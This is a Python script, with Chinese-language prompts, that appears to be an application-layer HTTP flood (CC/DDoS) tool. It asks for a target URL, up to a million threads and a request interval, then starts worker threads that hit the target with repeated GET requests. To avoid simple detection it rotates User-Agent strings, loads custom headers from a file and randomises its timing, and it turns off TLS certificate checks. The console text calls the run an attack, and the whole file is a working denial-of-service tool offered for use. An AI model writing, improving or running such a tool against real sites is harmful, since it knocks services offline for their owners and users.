import os
import time
import threading
import random
import requests
from requests.exceptions import RequestException

# 常量定义
START_TIME = 5
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_headers():
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive'
    }
    try:
        if os.path.exists("CC\\cc_headers.txt"):
            with open("CC\\cc_headers.txt", "r", encoding="utf-8") as f:
                for line in f:
                    if ':' in line:
                        key, value = line.strip().split(':', 1)
                        headers[key.strip()] = value.strip()
    except Exception as e:
        print(f"[警告] 加载自定义头文件失败: {str(e)}")
    return headers

def send_request(url, timeout=10):
    try:
        headers = load_headers()
        time.sleep(random.uniform(0.1, 0.5))
        response = requests.get(
            url,
            headers=headers,
            timeout=timeout,
            verify=False
        )
        if random.random() < 0.3:
            print(f"[{threading.current_thread().name}] 请求成功 | 状态码: {response.status_code}")
        return True
    except RequestException as e:
        if random.random() < 0.2:
            print(f"[{threading.current_thread().name}] 请求异常: {str(e)}")
        return False

def worker(url, interval):
    try:
        while not exit_flag:
            success = send_request(url)
            if not success:
                time.sleep(1)
            sleep_time = interval * random.uniform(0.8, 1.2)
            time.sleep(max(0.1, sleep_time))
    except Exception as e:
        print(f"[严重错误] 工作线程崩溃: {str(e)}")

def get_user_input():
    clear_screen()
    print("\n[攻击参数设置]")
    print("-" * 40)
    while True:
        url = input("请输入目标URL (包含http://或https://): ").strip()
        if url.startswith(('http://', 'https://')):
            break
        print("错误: URL必须以http://或https://开头")
    while True:
        try:
            threads_num = int(input("设置线程数 (1-1000000): "))
            if 1 <= threads_num <= 1000000:
                break
            print("错误: 线程数必须在1 ~ 1000000之间")
        except ValueError:
            print("错误: 请输入有效数字")
    while True:
        try:
            interval = float(input("设置请求间隔秒数 (0 ~ 10): "))
            if 0 <= interval <= 10:
                break
            print("错误: 间隔时间必须在0 ~ 10秒之间")
        except ValueError:
            print("错误: 请输入有效数字")
    return url, threads_num, interval

# 全局控制变量
exit_flag = False

def main():
    global exit_flag
    # 获取用户输入
    url, threads_num, interval = get_user_input()
    # 显示攻击配置
    clear_screen()
    print("\n[攻击配置]")
    print("-" * 40)
    print(f"目标URL: {url}")
    print(f"线程数量: {threads_num}")
    print(f"请求间隔: {interval}秒")
    print(f"请求头: {load_headers()}")
    print("-" * 40)
    print(f"\n将在{START_TIME}秒后启动，按Ctrl+C取消...")
    try:
        for i in range(START_TIME, 0, -1):
            print(f"倒计时: {i}秒", end='\r', flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n用户取消操作")
        return
    print(f"\n启动{threads_num}个线程攻击目标...")
    threads = []
    try:
        for i in range(threads_num):
            t = threading.Thread(
                target=worker,
                args=(url, interval),
                name=f"Worker-{i+1}"
            )
            t.daemon = True
            t.start()
            threads.append(t)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n接收到停止信号...")
        exit_flag = True
        for t in threads:
            t.join(2)
    finally:
        print("\n攻击已完全停止")

def thread_cc_main():
    try:
        main()
    except Exception as e:
        print(f"\n程序发生错误: {str(e)}")
    finally:
        input("\n按Enter键退出...")